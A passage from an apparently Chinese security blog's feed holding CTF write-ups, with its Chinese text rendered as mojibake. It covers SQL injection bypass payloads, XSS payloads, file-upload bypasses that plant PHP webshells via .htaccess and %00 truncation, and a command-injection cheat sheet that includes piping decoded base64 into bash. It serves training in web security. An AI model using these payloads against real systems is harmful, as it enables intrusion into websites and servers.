class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.showèŒæ–°è®¡åˆ’web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># åŒ…å«æ•°æ®åº“è¿æ¥æ–‡ä»¶</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># åˆ¤æ–­getæäº¤çš„å‚æ•°idæ˜¯å¦å­˜åœ¨</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    # åˆ¤æ–­idçš„å€¼æ˜¯å¦å¤§äº999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id å¤§äº 999 ç›´æ¥é€€å‡ºå¹¶è¿”å›é”™è¯¯</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id å°äº 999 æ‹¼æ¥sqlè¯­å¥</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;æ‰§è¡Œçš„sqlä¸ºï¼š$sql&lt;br&gt;&quot;;</span><br><span class="line">        # æ‰§è¡Œsql è¯­å¥</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # åˆ¤æ–­æœ‰æ²¡æœ‰æŸ¥è¯¢ç»“æœ</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # å¦‚æœæœ‰ç»“æœï¼Œè·å–ç»“æœå¯¹è±¡çš„å€¼$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # å…³é—­æ•°æ®åº“è¿æ¥</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><p>ç”±äºæ²¡æœ‰é™åˆ¶è¾“å…¥ï¼Œæ‰€ä»¥åªéœ€è¦åˆ©ç”¨inval()çš„æ¼æ´å’Œsqlæ³¨å…¥æ¼æ´æ‹¿åˆ°flagã€‚</p><ol><li><p>?id=â€™1000â€˜       #å­—ç¬¦ä¸²ç»•è¿‡</p></li><li><p>?id=0x3e8      #è½¬æ¢æˆ16è¿›åˆ¶ç»•è¿‡</p></li><li><p>?id=-1 or id=1000</p></li><li><p>?id=100*10</p></li><li><p>?id=~~1000   #ä¸¤æ¬¡å–å</p></li><li><p>?id=900%2B100      #%2Bæ˜¯+çš„urlç¼–ç </p></li><li><p>?id=round(999.9)</p></li><li><p>?id=999 or 1=1 --+</p></li><li><p>?id=0b1111101000     #äºŒè¿›åˆ¶</p></li><li><p>?id=125&lt;&lt;3</p></li><li><p>?id=1 union select * from article; --+</p></li><li><p>?id=/<em>!1000</em>/ å†…è”æ³¨é‡Š</p></li></ol></blockquote><blockquote><p>ctfshow{5853bd20-b1d4-420d-aa13-0c343c7e9461}</p></blockquote><h2 id="web2">web2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.showèŒæ–°è®¡åˆ’web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># åŒ…å«æ•°æ®åº“è¿æ¥æ–‡ä»¶</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># åˆ¤æ–­getæäº¤çš„å‚æ•°idæ˜¯å¦å­˜åœ¨</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/or|\+/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    # åˆ¤æ–­idçš„å€¼æ˜¯å¦å¤§äº999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id å¤§äº 999 ç›´æ¥é€€å‡ºå¹¶è¿”å›é”™è¯¯</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id å°äº 999 æ‹¼æ¥sqlè¯­å¥</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;æ‰§è¡Œçš„sqlä¸ºï¼š$sql&lt;br&gt;&quot;;</span><br><span class="line">        # æ‰§è¡Œsql è¯­å¥</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # åˆ¤æ–­æœ‰æ²¡æœ‰æŸ¥è¯¢ç»“æœ</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # å¦‚æœæœ‰ç»“æœï¼Œè·å–ç»“æœå¯¹è±¡çš„å€¼$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # å…³é—­æ•°æ®åº“è¿æ¥</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><blockquote><p>å¤šäº†ä¸€ä¸ªè¿‡æ»¤ï¼Œä¸èƒ½ç”¨or, +å·ï¼Œä¸Šé¢ç­›é€‰ä¸€ä¸‹å°±è¡Œ</p><p>?id=â€˜1000â€™</p></blockquote><blockquote><p>ctfshow{622abd97-affc-4f13-9cb8-7181b9cc0ffa}</p></blockquote><h2 id="web3">web3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>ä¾ç„¶æ˜¯å¤šäº†ä¸ªè¿‡æ»¤ã€‚?id=â€˜1000â€™</p><p>ctfshow{560b6c4f-7a73-4d0d-96ae-cb941878bdc9}</p></blockquote><h2 id="web4">web4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>?id=â€˜1000â€™</p><p>ctfshow{3390706c-7566-466c-a86e-37a6d19f95cc}</p></blockquote><h2 id="web5">web5</h2>]]></content>
    
    
    <summary type="html">ctfshowèŒæ–°web-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>CTFHubæŠ€èƒ½æ ‘-XSS</title>
    <link href="https://m3x1.cn/posts/57dd66d8.html"/>
    <id>https://m3x1.cn/posts/57dd66d8.html</id>
    <published>2024-12-01T14:09:31.075Z</published>
    <updated>2024-12-01T16:06:22.799Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åå°„å‹">åå°„å‹</h2><p>æ‰“å¼€ç½‘ç«™</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9bb879732317d8055c0970fba4a32d29.png" alt="img"></p><p>åå°„å‹ï¼Œç›´æ¥ä½¿ç”¨xsså¹³å°ï¼Œå°†ç”Ÿæˆçš„åœ°å€ä¼ å…¥ç¬¬ä¸€ä¸ªç©º</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>ç„¶åå°†urlä»£ç ä¼ å…¥ç¬¬äºŒä¸ªç©ºå°±è¡Œ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191309973.png" alt="image-20241128191309973"></p><p>flag=ctfhub{a51bb55f89d068a011466d62}</p><h2 id="å­˜å‚¨å‹">å­˜å‚¨å‹</h2><p>æ‰“å¼€ç½‘ç«™ï¼Œä¾ç„¶åƒä¸Šé¢çš„æ­¥éª¤ä¸€æ ·ã€‚</p><p>åŒºåˆ«äºå‰é¢åå°„å‹xssçš„æ˜¯ï¼Œä»–å»ºç«‹æ¶æ„è¿æ¥æ˜¯åœ¨äºæ¯ä¸€æ¬¡éƒ½è¦å‘é€å«æ¶æ„ä»£ç ï¼Œè€Œè¿™ä¸ªå­˜å‚¨xssä¸éœ€è¦ï¼Œä¸€æ—¦å‘é€è¿‡ä¸€æ¬¡ï¼Œä»¥åæ¯æ¬¡è®¿é—®å®ƒæ—¶ï¼Œéƒ½ä¼šå«æœ‰æ¶æ„ä»£ç </p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215208090.png" alt="image-20241128215208090"></p><blockquote><p>flag=ctfhub{1cef0cbbc0bb33244d4a5c76}</p></blockquote><h2 id="DOMåå°„">DOMåå°„</h2><p>æŸ¥çœ‹æºç ä½ç½®</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215659407.png" alt="image-20241128215659407"></p><p>éœ€è¦é—­åˆå‰é¢çš„ â€™  ï¼Œæ‰€ä»¥åªéœ€è¦åœ¨xssæ³¨å…¥æ—¶å‰é¢åŠ ä¸Šâ€™; ï¼Œç„¶åæŠŠåé¢çš„â€™;æ³¨é‡Šæ‰ã€‚</p><p>ç”±äºå‰é¢æ²¡æœ‰ä¸œè¥¿äº†ï¼Œæ‰€ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script src= &gt;</span><br></pre></td></tr></table></figure><p>å…¶ä½™æ­¥éª¤ä¸€æ ·</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128220249060.png" alt="image-20241128220249060"></p><blockquote><p>flag=ctfhub{aebf8f6244f0ad340612cc6e}</p></blockquote><h2 id="è¿‡æ»¤ç©ºæ ¼">è¿‡æ»¤ç©ºæ ¼</h2><p>æ­¥éª¤ä¸€æ ·ï¼Œç©ºæ ¼å¯ä»¥ç”¨[/]æˆ–è€…/**/ä»£æ›¿</p><blockquote><p>flag=ctfhub{9830f9e82cfbc1e77a1d0dae}</p></blockquote><h2 id="è¿‡æ»¤å…³é”®è¯">è¿‡æ»¤å…³é”®è¯</h2><p>å…ˆç”¨æ¢é’ˆè¯•è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230131380.png" alt="image-20241128230131380"></p><p>å‘ç°æ²¡æœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ˜¯è¿‡æ»¤äº†å…³é”®å­—scriptï¼Œå¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œç”¨sCRiPt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230522782.png" alt="image-20241128230522782"></p><blockquote><p>flag=ctfhub{9f0740745ba9e7b754658614}</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHubæŠ€èƒ½æ ‘-XSSç³»åˆ—wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>CTFHubæŠ€èƒ½æ ‘-æ–‡ä»¶ä¸Šä¼ </title>
    <link href="https://m3x1.cn/posts/2f3e3730.html"/>
    <id>https://m3x1.cn/posts/2f3e3730.html</id>
    <published>2024-12-01T13:57:29.734Z</published>
    <updated>2024-12-01T16:06:22.801Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="æ–‡ä»¶ä¸Šä¼ ">æ–‡ä»¶ä¸Šä¼ </h2><blockquote><p>æ¥æºï¼šCTFHubæŠ€èƒ½æ ‘</p></blockquote><h4 id="æ— éªŒè¯">æ— éªŒè¯</h4><blockquote><p>ç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œä¼šæ˜¾ç¤ºè·¯å¾„ï¼Œç›´æ¥èšå‰‘è¿æ¥æ‰¾åˆ°flagã€‚</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112713829.png" alt="image-20241109112713829"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112741306.png" alt="image-20241109112741306"></p><h4 id="å‰ç«¯éªŒè¯">å‰ç«¯éªŒè¯</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112850962.png" alt="image-20241109112850962"></p><blockquote><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°è¿›è¡Œäº†å‰ç«¯éªŒè¯ï¼Œå¿…é¡»æ˜¯jpg,pngæˆ–è€…gifæ–‡ä»¶ã€‚</p><p>ç›´æ¥æŠ“åŒ…æ”¹åŒ…å‘é€ç»•è¿‡</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109113155795.png" alt="image-20241109113155795"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109113230322.png" alt="image-20241109113230322"></p><blockquote><p>ä¸Šä¼ æˆåŠŸï¼Œç›´æ¥èšå‰‘è¿æ¥æ‰¾flagå°±è¡Œã€‚</p></blockquote><h4 id="htaccess">.htaccess</h4><blockquote><p>çŸ¥è¯†ï¼šhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½</p></blockquote><blockquote><p>ä»‹ç»ï¼šhatccessæ–‡ä»¶ï¼Œ.htaccessæ˜¯Apacheçš„åˆä¸€ç‰¹è‰²ã€‚<br>â— ä¸€èˆ¬æ¥è¯´ï¼Œé…ç½®æ–‡ä»¶çš„ä½œç”¨èŒƒå›´éƒ½æ˜¯å…¨å±€çš„ï¼Œä½†Apacheæä¾›äº†ä¸€ç§å¾ˆæ–¹ä¾¿çš„ã€å¯ä½œç”¨äºå½“å‰ç›®å½•åŠå…¶å­ç›®å½•çš„é…ç½®æ–‡ä»¶â€”â€”.htaccessï¼ˆåˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼‰ï¼Œ<br>â— æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚<br>â— ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚<br>â— ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æˆ‘ä¸Šä¼ äº†ä¸€ä¸ª.htaccessæ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¹‹åå°±ä¼šå°†ç‰¹å®šæ ¼å¼çš„æ–‡ä»¶ä»¥phpæ ¼å¼è§£æã€‚</p></blockquote><blockquote><p>æ‰€ä»¥å…ˆåˆ›å»ºä¸€ä¸ª .htaccessçš„æ–‡ä»¶ï¼Œé‡Œé¢è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;pass777&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºæ–‡ä»¶åä¸­åŒ…å«pass777çš„æ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œphpæ‰§è¡Œ</p><p>æ‰€ä»¥å†å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œæ–‡ä»¶åä¸­åŒ…å«pass777ï¼Œä¸Šä¼ åç”¨èšå‰‘è¿æ¥å°±èƒ½æ‹¿åˆ°flag</p></blockquote><blockquote><p>ctfhub{2428d2cef017f7d0e902eaac}</p></blockquote><h4 id="MIMEç»•è¿‡">MIMEç»•è¿‡</h4><blockquote><p>ç›´æ¥å°†ä¸€å¥è¯æœ¨é©¬åç¼€æ”¹æˆjpgï¼Œç„¶åæŠ“åŒ…ä¿®æ”¹æˆphpï¼Œèšå‰‘è¿æ¥å°±èƒ½æ‹¿åˆ°</p><p>ctfhub{c76881cacfd16db8afee74fd}</p></blockquote><h4 id="00æˆªæ–­">00æˆªæ–­</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120203556473.png" alt="image-20241120203556473"></p><blockquote><p>æ ¹æ®å‰ç«¯æç¤ºï¼Œå‘ç°ä¸Šä¼ ç±»å‹é™åˆ¶æˆäº†jpg,png,gifæ–‡ä»¶ï¼Œå¹¶ä¸”å¦‚æœæ–‡ä»¶ç±»å‹è¢«å…è®¸ï¼Œæ„é€ ç›®æ ‡è·¯å¾„ï¼ˆ<code>$des</code>ï¼‰ï¼Œè¯¥è·¯å¾„ç”±<code>$_GET['road']</code>ï¼ˆä»URLçš„æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­è·å–ï¼‰ï¼Œä¸€ä¸ªéšæœºæ•°ï¼ˆ10åˆ°99ä¹‹é—´ï¼‰ï¼Œå½“å‰æ—¥æœŸå’Œæ—¶é—´ï¼ˆæ ¼å¼ä¸º<code>YmdHis</code>ï¼‰ï¼Œä»¥åŠæ–‡ä»¶æ‰©å±•åç»„æˆï¼Œå¹¶ä½¿ç”¨<code>move_uploaded_file()</code>å‡½æ•°å°†ä¸Šä¼ çš„æ–‡ä»¶ä»ä¸´æ—¶ç›®å½•ç§»åŠ¨åˆ°ç›®æ ‡ç›®å½•ï¼ˆ<code>$des</code>ï¼‰</p><p>æ‰€ä»¥åœ¨è·¯å¾„å¤„ä¿®æ”¹æˆ.phpçš„è·¯å¾„ï¼Œç„¶åç”¨%00æˆªæ–­ï¼Œè®©åé¢æ·»åŠ çš„ç›®å½•å¤±æ•ˆ</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120204749984.png" alt="image-20241120204749984"></p><blockquote><p>ç”±äºæˆ‘ä»¬ä¿®æ”¹äº†è·¯å¾„ï¼Œæ‰€ä»¥ä¿å­˜è·¯å¾„å°±æ˜¯åŸæ¥çš„/upload/yjh-cmd.php</p><p><a href="http://xn--challenge-a074b1b840a3ecbe-uw57b2z5yej5jvy6b.sandbox.ctfhub.com:10800/upload/123.php">èšå‰‘è¿æ¥challenge-a074b1b840a3ecbe.sandbox.ctfhub.com:10800/upload/123.php</a></p><p>ctfhub{e158c8b8eb6fdb23553ce830}</p></blockquote><h4 id="åŒå†™åç¼€">åŒå†™åç¼€</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);</span><br><span class="line">$name = str_ireplace($blacklist, &quot;&quot;, $name);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><blockquote><p>çœ‹æç¤ºå‘ç°è¿‡æ»¤äº†ä¸€ç³»åˆ—åç¼€ï¼Œç„¶åä¼šæŠŠåç¼€æ›¿æ¢æˆæ— ï¼Œæ‰€ä»¥åŒå†™ç»•è¿‡,å¦‚ï¼šyjh.pphphp</p><p>ctfhub{a0a5473d07fac34189262488}</p></blockquote><h4 id="æ–‡ä»¶å¤´æ£€æŸ¥">æ–‡ä»¶å¤´æ£€æŸ¥</h4><blockquote><p>å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åæœ‰æç¤º</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120211213870.png" alt="image-20241120211213870"></p><blockquote><p>é‚£å°±æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹,åŒæ—¶åœ¨ä¸€å¥è¯æœ¨é©¬å‰åŠ ä¸ŠGIF89a,ç”¨æ¥è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå›¾ç‰‡</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120211402688.png" alt="image-20241120211402688"></p><blockquote><p>èšå‰‘è¿æ¥å¾—åˆ°flag</p><p>ctfhub{5602bccd8ab06a8c2408fb81}</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHubæ–‡ä»¶ä¸Šä¼ ç³»åˆ—wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œè¿‡æ»¤å…³é”®å­—</title>
    <link href="https://m3x1.cn/posts/d36c6b6d.html"/>
    <id>https://m3x1.cn/posts/d36c6b6d.html</id>
    <published>2024-11-29T16:00:00.000Z</published>
    <updated>2024-12-02T08:48:57.118Z</updated>
    
    <content type="html"><![CDATA[<h2 id="è¿‡æ»¤å…³é”®å­—">è¿‡æ»¤å…³é”®å­—</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5415034b6a6c6d525395ede652e55b0f.png" alt=""></p><p>åæ–œæ ç»•è¿‡  <code>ca\t y1n\g.php</code><br>ä¸¤ä¸ªå•å¼•å·ç»•è¿‡  <code>cat y1''ng.php</code><br>base64ç¼–ç ç»•è¿‡ <code>echo â€œbase64ç¼–ç â€ | base64 -d | bash</code><br>hexç¼–ç ç»•è¿‡ <code>echo &quot;hexç¼–ç &quot; | xxd -r -p | bash</code><br>ç”¨[ ]è¿›è¡ŒåŒ¹é…  <code>cat y1[n]g.php</code><br>ç”¨* åŒ¹é…ä»»æ„ <code>cat y1n*</code><br>ç”¨?åŒ¹é…ä»»æ„ <code>cat y1n?</code><br>ç”¨{ }åŒ¹é…èŒƒå›´ <code>cat y1&#123;a..z&#125;g.php</code><br>å˜é‡ <code>$a=fl;$b=ag;cat $a$b.php</code><br>æ‹¼æ¥ç»•è¿‡ <code>â€˜flâ€™.'ag'</code></p><p>æ‹¬å·ç»•è¿‡ (sy.(st).em)(ls);</p><p>é™¤äº†ä¸Šè¿°æ–¹å¼ï¼Œè¿˜å¯ä»¥ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ç»•è¿‡ã€‚</p><p>pythonå­—ç¬¦ä¸²æ‹¼æ¥:<br>1.+       eg: â€˜aâ€™+â€˜bâ€™     è¾“å‡º:â€˜abâ€™<br>2.è´´è´´    eg: â€˜aâ€™â€˜bâ€™       è¾“å‡º:â€˜abâ€™</p><p>PHPæ‹¼æ¥:<br>.    eg: â€˜aâ€™.â€˜bâ€™      è¾“å‡º:â€˜abâ€™</p><p>è§£é‡Šå†…è”æ‰§è¡Œï¼šå°†å‰ä¸€ä¸ªæ‰§è¡Œç»“æœä½œä¸ºåä¸€ä¸ªæ‰§è¡Œçš„å‚æ•°ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ede76d59480f5f8a630234a9b9262bfd.jpg" alt=""></p><h2 id="è¿‡æ»¤æ‰€æœ‰å­—æ¯å’Œæ•°å­—">è¿‡æ»¤æ‰€æœ‰å­—æ¯å’Œæ•°å­—:</h2><p>1.ä½è¿ç®—-å¼‚æˆ–ï¼ˆè§è„šæœ¬ï¼‰<br>2.å–åï¼ˆè§è„šæœ¬ï¼‰</p><p>3.çŸ­æ ‡ç­¾</p><p>ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå°†å®ƒç”¨æ‹¬å·æ‹¬èµ·æ¥ï¼Œåé¢å†è·Ÿä¸€ä¸ªæ‹¬å·ï¼Œå°±ä¼šè°ƒç”¨åŒåçš„å‡½æ•°ã€‚</p><p>eg:(â€œsystemâ€)();  å…¶å®å°±ç­‰äºæ‰§è¡Œ  system();</p><p>eg:(â€œsystemâ€)(â€œlsâ€);  å…¶å®å°±ç­‰äºæ‰§è¡Œ  system(â€œlsâ€);</p><p>å°† system ç­‰å­—ç¬¦ä¸²ç”¨ä½è¿ç®—è¿›è¡Œç¼–ç ï¼Œå¯ä»¥ç»•è¿‡è®¸å¤šè¿‡æ»¤ã€‚<br>æ³¨æ„: ç¼–ç åä¸ç”¨&quot;&quot;ï¼Œæ ·å¼æ˜¯ 